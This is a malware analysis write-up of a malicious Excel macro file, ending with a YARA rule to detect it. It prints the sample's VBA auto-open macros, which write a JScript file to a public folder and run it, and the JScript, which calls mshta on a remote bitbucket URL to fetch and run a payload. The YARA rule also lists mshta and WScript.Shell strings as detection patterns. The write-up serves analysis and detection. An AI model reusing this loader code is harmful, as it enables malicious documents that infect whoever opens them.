**SHA256**: 05aa485c6efbef1c65e5876428d00cbb72b85b0c16530ec9f0ed47355f8189d6  
**FileType**: XLSM (Microsoft Excel)  
**Sample**: https://bazaar.abuse.ch/sample/05aa485c6efbef1c65e5876428d00cbb72b85b0c16530ec9f0ed47355f8189d6/

## Analysis  
- Extracted the file from the `05aa485c6efbef1c65e5876428d00cbb72b85b0c16530ec9f0ed47355f8189d6.zip`  
- Renamed `05aa485c6efbef1c65e5876428d00cbb72b85b0c16530ec9f0ed47355f8189d6.xlsm` to `sample.xlsm`  
- Unzipped the `sample.xlsm`  
    - Command: `unzip sample.xlsm`  
    - Extracted the raw xml files that make the XLSM file  
- Moved all files to `sample_unzipped`  
- Viewing the `[Content_Types].xml` files shows there are 3 sheets, a `sharedStrings.xml` and Macros are enabled
- The 3 worksheets do not contain any content of interest
- `sharedStrings.xml` contains code involving `WSCRIPT.Shell`
```JS
chuchukukukaokiwDasidow = new ActiveXObject('Wscript.Shell');KALYJA = "mshta https://bitbucket.org/!api/2.0/snippets/hogya/M9xe79/890b898167a2c0437e6c07c6ef3027af53541881/files/mrxxx";chuchukukukaokiwDasidow.run(KALYJA,0);
```
- VBA macros embedded in the excel perform the following:
  - Command: `olevba --code sample.xlsm`
  - Invokes the `motor` & `File` subroutines.
    ```VBA
    Private Sub Workbook_Open()
      motor
      File
    End Sub
    ```
  - The `motor` routine performs the following:
    - Hides the `FAIRBANKS RENOVATIONS` sheet
    - Activates the `FAIRBANKS RENOVATION` sheet and in turn activating the marco execution
    ```VBA
    Sub motor()
      Sheets("FAIRBANKS RENOVATION").Visible = xlSheetVisible
      Worksheets("FAIRBANKS RENOVATION").Activate
      Sheets("FAIRBANKS RENOVATIONS").Visible = xlSheetHidden
    End Sub
    ```
  - The `File` routine performs the following:
    - Opens `C:\Users\Public\textfile.JS`
    - Writes the following to it and executes its
      ```JS
      // Found in the sharedStrings.xml file
      objectShell = new ActiveXObject('Wscript.Shell');
      // file no long availble - it has been removed by bitbucket
      url = "mshta https://bitbucket[dot]org/!api/2.0/snippets/hogya/M9xe79/890b898167a2c0437e6c07c6ef3027af53541881/files/mrxxx";
      objectShell.run(url,0);
      ```
      ```VBA
      // Not original code - it has been modified
      Option Explicit
      Sub File()
          'variables that you need to use in the code
          Dim TextFile As Integer
          Dim i As Integer
          Dim myFile As String

          myFile = "C:\Users\Public\textfile.JS"
          TextFile = FreeFile
          Open myFile For Output As TextFile

          For i = 1 To 1
              Dim youtube As String
              youtube = Worksheets("blanked").Range("To1029")
              Print #TextFile, youtube
          Next i

          Close #TextFile

          ActiveCell.Value = ""
          Dim a As String
          a = "WSCRIPT C:\Users\Public\textfile.JS"
          Call Shell(a, vbNormalFocus)
      End Sub
      ```  
## Yara Rule
```YAML
rule wscript_shell_executions_for_textfile_js {
    meta: 
        Description = "Rule to find WScript Shell executions in excel files involving textfile.JS"
        Author = "Twitch/notdankenoughq / Github/M-Faheem-Khan"
        Date = "August 13, 2022"

    strings:
        // file header / signature
        $xlsm_file_header = { 50 4b }
        $content_type_xml = { 5b 43 6f 6e 74 65 6e 74 5f 54  79 70 65 73 5d 2e 78 6d 6c }
        // Content to search for
        $file_name = "textfile.JS"
        $textfile_js_path = "C:\\Users\\Public\\textfile.JS"
        $object_shell_initialization = "new ActiveXObject('Wscript.Shell')"
        $mshta_execution_http = "mshta http://"
        $mshta_execution_https = "mshta https://"
    
    condition:
        any of them
}
```

<!-- EOF -->
